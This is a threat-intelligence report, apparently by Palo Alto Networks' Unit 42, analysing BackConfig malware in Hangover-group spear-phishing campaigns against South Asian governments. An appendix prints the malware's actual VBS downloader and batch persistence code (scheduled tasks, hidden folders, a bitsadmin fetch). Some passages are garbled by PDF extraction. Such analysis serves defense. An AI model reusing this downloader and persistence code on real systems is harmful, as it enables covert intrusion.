5/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaUpdated BackConﬁg Malware Targeting Government and Military Organizations in South Asiaunit42.paloaltonetworks.com/updated-backconﬁg-malware-targeting-government-and-military-organizationsAlex Hinchliffe, Robert FalconeMay 12, 2020Executive Summary Unit 42 has observed activity over the last 4 months involving the BackConﬁg malware used by the Hangover threat group (aka Neon, Viceroy Tiger, MONSOON). Targets of the spear-phishing attacks, using local and topical lures, included government and military organizations in South Asia.The BackConﬁg custom trojan has a ﬂexible plug-in architecture for components offering various features, including the ability to gather system and keylog information and to upload and execute additional payloads.The initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via compromised legitimate websites for which the URLs are most likely shared via email. The documents use Visual Basic for Applications (VBA) Macro code which, if enabled by the victim, starts an installation process consisting of multiple components that result in the plug-in loader payload being downloaded and executed. The modular nature certainly allows for quicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious behaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the components in isolation.Our threat prevention platform with WildFire detects activity associated with this threat group, while simultaneously updating the ‘malware’ category within the PAN-DB URL ﬁltering solution for malicious and/or compromised domains that have been identiﬁed.urlﬁg-malware-targeting-government-and-military-organizations/1/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaIndicators of compromise related to this research are documented at the end of this report and in the Adversary Playbook for the Hangover threat group that can be accessed in the Unit 42 Unit 42 ﬁrst saw activity involving the Windows PE executable ﬁle (SHA256: AutoFocus data related to particular sectors and countries of interest.The ﬁle was ﬁrst seen on January 19th, 2020, having been downloaded by two organizations — a government department in one country and a military organization in another — within minutes of each other. The source of the download was url and the ﬁle httpsrequest was stored locally as dphc.exe. More details on how the malware was delivered are described later in the blog.The choice of terminology in URL paths and ﬁle names when delivering BackConﬁg malware in this, and other campaigns discussed later on, is clearly to blend in as benign operations, paths and ﬁlenames. Although spelled differently, it could be easy to believe the payload relates to the DHCP networking service.The purpose of this malware is to allow the actors to download and execute an executable ﬁle, as well as download and run batch ﬁles to run commands on the end system.This sample has a custom “decryption” routine that subtracts six from each character. The following strings are decrypted using this method:linkrequest[.]live \\Adobe\\Driver\\dwg\\pid.txt \\Adobe\\Driver\\dwg\\ \\Adobe\\Driver\\dwg\\wuaupdt.exeThe Trojan reads the following ﬁle to use in the URL of the C2 beacon. If the ﬁle does not exist, the executable will exit without performing any further activities. The pid.txt ﬁle is created during the earlier delivery and installation phases starting with the weaponized Excel document. More information about this setup process is covered later in the delivery section. As previously mentioned, this behavior makes an automated analysis of the individual executable payload component harder.%USERPROFILE%\Adobe\Driver\dwg\pid.txtThe C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE ﬂag used when calling the HttpOpenRequestA function. The beacon HTTP request will look like the following:GET /orderme/[contents of pid.txt ﬁle] HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 @/NEW Host: linkrequest[.]live [resolving to 23.106.123[.]87]urlﬁg-malware-targeting-government-and-military-organizations/2/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaThe Trojan will look for the following ﬁeld and values within the HTTP response header:“Content-Type: application” “Content-Type: xDvsds” “Content-Type: Bw11eW”If the content-type ﬁeld contains a value of application, the Trojan will extract a ﬁlename from the HTTP response headers between the string ﬁlename and Content-Transfer-Encoding. It will use this ﬁlename to create a ﬁle in the %USERPROFILE%\Adobe\Driver\dwg\ folder, which it will write the data in the HTTP response to. Based on the other two Content-Types, we believe the ﬁlename provided will be either “wuaupdt.exe” or test.bat.If the content-type ﬁeld has a value of xDvsds, the Trojan will attempt to execute the following ﬁle using ShellExecuteA and the “open” method:%USERPROFILE%\Adobe\Driver\dwg\wuaupdt.exeIf the content-type ﬁeld has a value of Bw11eW, the Trojan will attempt to execute the following ﬁle using ShellExecuteA and the “open” method:%USERPROFILE%\Adobe\Driver\dwg\test.batAt the time of writing, the C2 appeared inoperational and no further payloads were seen. We believe that the resultant wuaupdt.exe ﬁle would then provide further capabilities to steal information, log keystrokes, and provide the ability to run additional commands either directly or via additional plugins which it would download, as documented by the Qihoo 360 Threat Intelligence group in their investigation of prior campaigns here.Unit 42 has conducted cursory binary difﬁng for many of the BackConﬁg executable ﬁles and did not ﬁnd any non-library function overlaps that would suggest that the payloads are based on the YTY or EHDev frameworks as mentioned here and here. PE Metadata The malware sample contains some interesting static artifacts including self-signed digital certiﬁcates used to sign the executable purporting to be software from the Foxit Software Incorporated company based in California. It is not known why the actors picked this company — and others listed in Table 1 below — to impersonate but, as previously mentioned, their use of ﬁlenames and URLs makes their payloads appear benign and trustworthy.Using this meta-data, together with information gleaned from infrastructure investigation, Unit 42 were able to pivot around on AutoFocus data to ﬁnd additional BackConﬁg PE executable samples. Those samples from the last 12 months are listed in Tables 1 and 2 below.SHA256Compilation Time (UTC)First Seen (Paciﬁc)Signer Name84e5629… 01/20/2020 7:26:09am 01/19/2020 11:49:03pmFoxit Software Incorporatedurlﬁg-malware-targeting-government-and-military-organizations/3/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South Asia18ce3ee… 10/10/2019 9:22:11am 01/16/2020 4:30:26pm 4a4bc01… 11/21/2019 9:19:49am 01/16/2020 1:31:46am 91c67c1… 11/21/2019 9:19:49am 12/02/2019 2:03:41am de5b670… 11/21/2019 9:19:49am 11/21/2019 11:59:05pm f79ebf0… 10/28/2019 5:35:26am 11/09/2019 10:32:09pm 31faeef… 10/10/2019 9:22:11am 10/13/2019 10:11:04pm d87b875… 09/12/2019 5:54:04am 09/26/2019 9:32:19am 1510996… 12/05/2018 4:35:03am 04/09/2019 10:30:16amwind0wsNVIDIA CorporationFoxit Software Incorporated Digicert GlobalFoxit Software IncorporatedTable 1. Describing PE compile times and Digital signatures used, ordered by ﬁrst seen.The Compilation Time stored in executable (SHA256: 84e5629…) appears to be after the point at which the ﬁle was ﬁrst seen by our WildFire analysis system. While the PE ﬁle timestamp could be modiﬁed post-compilation, the oddity is more likely explained away with time zones — 2349 Paciﬁc time on the 19th is 1350 in Bangladesh on the 20th, and 7:26am UTC is in the range of 11:26 to 13:26 across the South Asia region, which would make the sample compilation quite recent with respect to the delivery of it.More details about the self-signed digital certiﬁcates, as well as full hashes, can be found in the IOCs section at the end of this report.The following table shows the version information from the same PE ﬁles, grouped by similar File Description ﬁelds. The order remains the same, except for the sample (SHA256: 18ce3ee…) which was ﬁrst seen January 16th, 2020 but for some reason reverted to using exact version information seen in samples two to three months prior. Namely, Link Finder.SHA256File VersionCopyright06.10.2015 Альберт 01.05.2015 Copyright @ 2015-2026 secosec01.01.12ссылка10.01.2015 Copyright @ 2011- 2021 secosec Inc.urlﬁg-malware-targeting-government-and-military-organizations/4/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South Asia(Link, in English)91c67c1… de5b670…Finder18ce3ee… Link d87b875… scrapper01.01.12Link Finder13,9,1632Все права защищеныk (All rights reserved, in 2020 Techtest Inc. All Rights Reserved01.12.001scrapper 13,6,1662Copyright @Scrapper Ltd Reserved1510996… system process2,1,1,2015system process cleaner2,1,1,2015 Copyright © 2004- 2018 Foxit Software Inc. All Rights ReservedTable 2. Describing PE version info metadata, ordered by ﬁrst seen and grouped on matching data.Of the set, the ﬁle (SHA256: 1510996…) has most consistency in terms of a theme, using the Foxit Copyright information, self-signed digital signature and even using the company logo, as shown in the Figure below, for the executable ﬁle’s icon. The ﬁle’s copyright information only differs from that of Foxit’s Reader software by a missing period symbol, implying it was copied rather than created.Figure 2. Evolution of delivery payloadsThe actors then moved to use seemingly ﬁctitious company and product names while using a mixture of signer names in their digital signatures. No ﬁle icons were used at all over the last 11 months.Recent samples also included Cyrillic text in the ﬁle description, product name, and copyright ﬁelds, as shown and translated in the table above. It’s hard to know if this is an attempt to set false ﬂags as to the origins of the BackConﬁg malware, or perhaps to make the content more relevant to speciﬁc targets within the victim organizations. Delivery and Installation In this section, we describe how the various payloads are delivered based on what we have seen in our customer networks, as well as what we have established through open-source research. Unit 42 has yet to see any evidence of weaponized documents used to deliver BackConﬁg being attached on phishing emails and that phishing URL links in emails appear to be the Hangover group’s modus operandi.The remainder of this section focuses largely on Object Linking and Embedding (OLE) Microsoft Excel documents, as they are most commonly used by the Hangover group, at least when it comes to the BackConﬁg malware. Through infrastructure analysis however, Unit 42 was able to ﬁnd a BackConﬁg PE sample (SHA256: 10/24/2019) using the C2 domain matissues[.]com and dropped by the weaponised Rich Texturlﬁg-malware-targeting-government-and-military-organizations/5/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaFormat (RTF) ﬁle (SHA256: The RTF used the CVE-2017-11882 exploit against equation editor vulnerabilities in Ofﬁce applications to execute the PE sample which was a unique exploitation method compared to all other samples analyzed. Compromised Third-Party Infrastructure Continuing to pivot on data obtained from the samples found thus far, we discovered some related URLs relating to compromised third-party infrastructure supporting the delivery of the BackConﬁg malware. The following table lists some examples of compromised sites delivering weaponised XLS ﬁles with ﬁlenames, such as Circular_No_03.xls (SHA256: Circullar_Nov_2017.xls (SHA256: with incorrect spelling) that the contents is, or relates to, a letter or advertisement which is distributed to a large number of people.SHA-256First Seen be3f12b… 2019-10Related URLurlﬁles/im age/ fbr.php and nphp_registration_for‐ m.php (both HTTP 404)0aa5cf1… 2018-09url content/images/fbr_circular.phped638b5… 2017-11url (down)Loca‐ and Legal Ad‐ dents to live and dev site Reference.Table 3. Compromised third-party infrastructure to support delivery of BackConﬁg.urlﬁg-malware-targeting-government-and-military-organizations/6/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaGiven the targeting related to these threats, and the compromised third-party websites, we believe the use of “fbr” in some of the URLs above likely relates to the Federal Board of Revenue (FBR) government organization of Pakistan. The “fbr” theme also runs into the VBA macro code. File ed638b5… contains the statement Const WelcomePage = “FBR”.The old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor (PHP) server-side scripts to deliver the weaponized XLS ﬁles. Instead, the pages simply used HTTP response status 301 (Moved Permanently) for URL redirection to said XLS, initiating the download. More recent examples make use of PHP with URL ﬁlenames matching the social engineering theme, such as “fbr”. In addition, the actors use the PHP script to log any visitors to the page noting in a ﬁle named “info.txt” the datetime stamp of the event, the client operating system, and their IP address.The location of the compromised third-party infrastructure or the organizations legitimately using them, align with the targeting Unit 42 has seen. This could be pure coincidence, a sign from the threat actors that their intention is to take advantage of weaknesses in the target country’s wider infrastructure, or the threat actors leveraging in-country infrastructure that may be considered more trustworthy by the intended victims and their security solutions.Palo Alto Networks’ WildFire sandbox analyzed sample ed638b5… on November 8th, 2017, and, as described in the table above, the sample was hosted on two compromised websites: a Bangladesh school and a Maldivan shipping agency. While Unit 42 has not seen Hangover activity in the Maldives, the archipelago is in the region alongside other known targets and interestingly, swore in a new President about a week after Unit 42 analyzed the sample.The EXE payload (SHA256: directly by the VBA code in sample ed638b5… from the URL below relates to those documented by BitDefender here. To date, Unit 42 has only seen 6 similar samples since the late-2017 timeframe for this sample, compared to many more prior, perhaps indicating a change over of the custom payloads used by the Hangover group. Certainly, there are some overlaping Tactics Techniques and Procedures (TTPs) between the older samples and the more recent BackConﬁg samples.url Evolution of Delivery Payloads Before moving on to describe the most recent samples and installation methods used by the Hangover actors, the timeline ﬁgure below provides a high-level view of the evolution in TTPs used.urlﬁg-malware-targeting-government-and-military-organizations/7/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaFigure 2. Evolution of delivery payloadsDespite the evolution over the years, some habits are hard to break. Firstly, every weaponized XLS Unit 42 has investigated loads a fake error message, such as the one shown in Figure 3 below, to trick the victim into thinking that the ﬁle is corrupt and thus nothing has — or will — load as intended. Another ﬁctitious error message text has been used in the past often with poor spelling or grammar.Figure 3. Example fake error message displayed to the victim.Similarly, the version information metadata stored in all the Excel documents analyzed share the same Author and Last Modiﬁed By names – Testing.The following subsections describe the campaigns and malware as highlighted by the three most recent milestones in the timeline ﬁgure above. 2019 Milestone: Multi-Component Registration Form.xls (SHA256: above provides an example of the types of lures used by the threat actors.urlﬁg-malware-targeting-government-and-military-organizations/8/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaUpon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on top white-background cells. As the ﬁlename suggests, it’s a registration form and relates to the Naya Pakistan Housing program run by the Pakistani government to help solve the housing shortfall in the country. Eligible citizens include government employees and registration forms were due by October 15th, 2019 (extended through November 15th), meaning the timing and the lure of the campaign on October 25th were clearly planned to increase the chances of compromise.Figure 4. Social engineering lure against Pakistan government in October 2019As the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS ﬁle be3f12b… was hosted at the URL listed in row 1 of Table 3 above. However, because of the following points, we have high conﬁdence in the campaign relationship between the two.urlﬁg-malware-targeting-government-and-military-organizations/9/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South Asia1.2019the XLS.1. AutoFocus and VirusTotal ﬁrst processed the XLS ﬁle be3f12b… on October 25th,2. VirusTotal processed the nsaimmigration… URL on the same day 3. A speciﬁc HTTP GET request URL using the notation nphp_registration_form.php?r=was processed in VirusTotal on the same day, and has relations to urlﬁn_div/session, which matches the IP address and URL structure in the VBS code dropped by the XLS be3f12b….4. The name of the PHP webpage nphp_registration_form.php relates to the ﬁlename ofThe VBA macro code in the XLS ﬁle be3f12b… differed somewhat from that of the samples of the previous years. Instead of directly storing encoded EXE ﬁles or running batch shell commands directly from the VBA code itself, it retrieved the content from hidden columns in the Excel sheet, starting at column 27 or “AA”, which is likely to be off-screen for most people. Once the font colour was changed, the “setup” batch code component as per previous variants, and the new Visual Basic Script (VBS) downloader component were revealed in columns AA and AB, respectively, as shown in ﬁgure 5 below.Figure 5. VBS downloader and BAT setup ﬁle revealed in the XLS sheet.Macro VBA code in the XLS parses the content of the two columns line by line writing the contents to their respective ﬁles on disk and executing them following the same process ﬂow as described below in Figure 6. 2019 Milestone: BITS and ZIPs A more recent weaponized XLS ﬁle (SHA256: WildFire on November 15th, 2019 and exposed some new techniques. On this occasion, the VBA macro code contained a decimal-encoded ZIP ﬁle of only 1,062 bytes in size. Inside the ZIP archive were two text ﬁles that would be decompressed to a folder driverkit. One ﬁle, driverkit.bat, is the “setup” BAT ﬁle already discussed in this report and listed in the appendix section. The other ﬁle, Winmgt.txt, is an adaptation of the VBS downloaded also described in this report.urlﬁg-malware-targeting-government-and-military-organizations/10/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaHowever, instead of a direct HTTP download using an MSXML DOM object, this version writes the following contents to Winmgt_Drive.bat, which is executed by a third scheduled task created by the “setup” BAT ﬁle.echo off bitsadmin /transfer Microsoft_Update /download /priority high url %USERPROFILE%\Adobe\Driver\pdf\winmgt.exe 62020 Milestone: Fine Tuning The following execution ﬂow diagram is based on one of the most recent weaponized documents Unit 42 has seen Invoice.xls (SHA256: 15).The infection process consists of multiple components as just described. The “setup” batch (BAT) ﬁle coordinates much of the infection process of the BackConﬁg plug-in loader once the VBA has created and contains the decimal-decoded VBS content.2. Similarly, the VBA code then writes batch code to another text ﬁle – Audio.txt. Thecontent of both ﬁles is shown in the appendix section of this report.3. Audio.txt is renamed to Audio.bat and executed. 4. Audio.bat cleans up any ﬁles and folders related to previous infections, and recreatesthe required environment including creating the aforementioned pid.txt ﬁle, and setting various folders and ﬁles to be hidden from a default Windows Explorer view. The contents of pid.txt is the victim’s computer name concatenated with a hyphen followed by a random number, although I believe the code used would not work as intended.5. Audio.bat continues by creating two scheduled tasks referencing two ﬁles that are yetto exist: dphc.exe will run every 10 minutes and Drive.vbs at 20 minute intervals. 6. Finally, before deleting itself, Audio.bat will rename Drive.txt to Drive.vbs. WhenDrive.vbs is eventually executed by the task scheduler, it will download the BackConﬁg executable payload. In the case of ﬁle 8892279f3… the remote location is url When dphc.exe is eventually executed by the task scheduler, it ﬁrst checks for thepresence of pid.txt (step 4.) and only continues if the ﬁle exists.Ultimately, the XLS writes two ﬁles to disk, one of which — the BAT — immediately modiﬁes some system settings and creates two scheduled tasks. However, this behaviour may not be enough to determine the components as malicious. Only after 20 minutes will the task scheduler execute the VBS downloader component and launch the BackConﬁg loader EXE, by which time analysis systems may have stopped monitoring. ATT&CK The following table describes the TTPs associated with the multiple campaigns described in this GatheringAdversary OpsecBuild CapabilitiesStage Capabilities Initial CompromiseTechnique (Mitre ATT&CK ID) Acquire OSINT data sets and information (T1247) Conduct social engineering (T1249) Compromise 3rd party infrastructure to support delivery (T1312) Create custom payloads (T1345) Obtain/re-use payloads (T1346) Upload, install, and conﬁgure software/tools (T1362) Spear Phishing Link (T1192)urlﬁg-malware-targeting-government-and-military-organizations/13/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaExecutionExecution, Persistence Defense EvasionDefense Evasion, Command & ControlUser Execution (T1204) Exploitation for Client Execution (T1203) Scheduled Task (T1053) Code Signing (T1116) Deobfuscate/Decode Files or Information (T1140) Hidden Files and Directories (T1158) Obfuscated Files or Information (T1027) Scripting (T1064)BITS Jobs (T1197)Commonly Used Port (T1043) Standard Application Layer Protocol (T1071) Standard Cryptographic Protocol (T1032) Remote File Copy (T1105)Conclusion The Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to Unit 42’s visibility, government and military organisations in South Asia using spear-phishing emails containing letters or government forms to lure victims into browsing to compromised websites serving weaponized Excel documents that install the BackConﬁg Trojan. Almost exclusively, Unit 42 has seen the use of weaponized documents that require user execution. Only once in the last six months have we seen use of exploits to circumvent the need for the user to execute any part of the installation chain.The evolution of BackConﬁg’s primary and secondary payloads has seen different methods used for executing commands and deploying executables both with and without obfuscation.The latest versions contain modular components making it easier to update and re-use code in order to rapidly deploy their campaigns in a timely manner to have the highest chance of success. The method in which the latest samples execute also indicates the group’s focus on trying to evade sandbox and other automated analysis systems by breaking down malicious activity into chunks that each seem relatively benign.Protections:Cortex XDR protects endpoints from all malware, exploits and ﬁleless attacks associated with Hangover actors.urlﬁg-malware-targeting-government-and-military-organizations/14/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaWildFire® cloud-based threat analysis service accurately identiﬁes samples as‐ sociated with these malware families.Threat Prevention provides protection against the known client and server-side vulnerability exploits, malware, and command and control infrastructure used by these actors.URL Filtering identiﬁes all phishing and malware domains associated with these actors and proactively ﬂags new infrastructure associated with these actors be‐ fore it is weaponized.Users of AutoFocus™ contextual threat intelligence service can view malware associated with these attacks using the following tags: More information about the Hangover group and the BackConﬁg malware can be found in AutoFocus.Palo Alto Networks has shared our ﬁndings, including ﬁle samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org. (This is added to blogs pre-shared with the CTA, when loaded into WordPress it will be added when appropriate). Indicators of Compromise 4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt / .bat from Naya Housing campaign) (Winmgt_Drive.bat uses bitsadmin) .vbs from Naya Housing campaign) set of downloaders) Infrastructure linkrequest[.]live (23.106.123[.]87) matissues[.]com unique.fontsupdate[.]com 185.203.119[.]184 212.114.52[.]148 Digital Signaturesurlﬁg-malware-targeting-government-and-military-organizations/16/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South AsiaThe following list of self-signed digital certiﬁcates is not exhaustive, and only relates to those seen issuer: CN=Foxit Software Incorporated subject: CN=Foxit Software Incorporated serial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8 valid from: 1/1/2018 issuer: CN=wind0ws subject: CN=wind0ws serial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70 valid from: 1/1/2019 issuer: CN=NVIDIA Corporation subject: CN=NVIDIA Corporation serial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1 valid from: 1/1/2019 valid to: 1/1/2025 Appendix The following VBS and BAT code was extracted from XLS sample (SHA-256: 23strFileURL = "url"</strong> Set oShell = CreateObject("WScript.Shell") strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%") strPath = "<strong>C:\Drivers\dphc.exe"</strong> On Error Resume Next Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") objXMLHTTP.open "GET", strFileURL, false objXMLHTTP.send() If objXMLHTTP.Status = 200 Then Set objADOStream = CreateObject("ADODB.Stream") objADOStream.Open objADOStream.Type = 1 objADOStream.Write objXMLHTTP.ResponseBody objADOStream.Position = 0 Set objFSO = CreateObject("Scripting.FileSystemObject") If objFSO.Fileexists(strPath) Then WScript.Quit() Set objFSO = Nothing objADOStream.SaveToFile strPath objADOStream.Close Set objADOStream = Nothing End if Set objXMLHTTP = Nothing“Setup” BAT component[Audio.txt -> Audio.bat CODE]1 2 3Set oFile = fso.CreateTextFile("c:\Drivers\Audio.txt") oFile.WriteLine ("echo off") oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\pdf")urlﬁg-malware-targeting-government-and-military-organizations/18/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South Asia4 32oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\dwg") oFile.WriteLine ("md %USERPROFILE%\Daily\Backup\Files") oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Adobe") oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Daily") oFile.WriteLine ("attrib +a +h +s C:\Drivers") oFile.WriteLine ("del /f %USERPROFILE%\Adobe\Driver\pdf\pid.txt") oFile.WriteLine ("del /f %USERPROFILE%\Adobe\Driver\dwg\pid.txt" oFile.WriteLine ("SET /A %COMPUTERNAME%") oFile.WriteLine ("SET /A RAND=%RANDOM% 10000 + 1") oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% >> %USERPROFILE%\Adobe\Driver\pdf\pid.txt") oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% >> <strong>%USERPROFILE%\Adobe\Driver\dwg\pid.txt")</strong> oFile.WriteLine ("schtasks /delete /tn Winmgt_log /f") oFile.WriteLine ("schtasks /delete /tn Yahoo_Drive /f") oFile.WriteLine ("schtasks /create /sc minute /mo 10 /f /tn Winmgt_log /tr C:\Drivers\dphc.exe") oFile.WriteLine ("schtasks /create /sc minute /mo 20 /f /tn Yahoo_Drive /tr C:\Drivers\Drive.vbs") oFile.WriteLine ("ren C:\Drivers\Drive.txt Drive.vbs ") oFile.WriteLine ("del %0") oFile.Close Set fso = Nothing Set oFile = Nothing Dim OldName, NewName GivenLocation = "C:\Drivers\" OldName = "Audio.txt"urlﬁg-malware-targeting-government-and-military-organizations/19/205/15/2020Updated BackConﬁg Malware Targeting Government and Military Organizations in South Asia<strong>NewName = "Audio.bat"</strong> On Error Resume Next Name GivenLocation & OldName As GivenLocation & NewName Dim RetVal RetVal = Shell("C:\Drivers\Audio.bat", vbHide)33 41Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from usBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.urlﬁg-malware-targeting-government-and-military-organizations/20/20 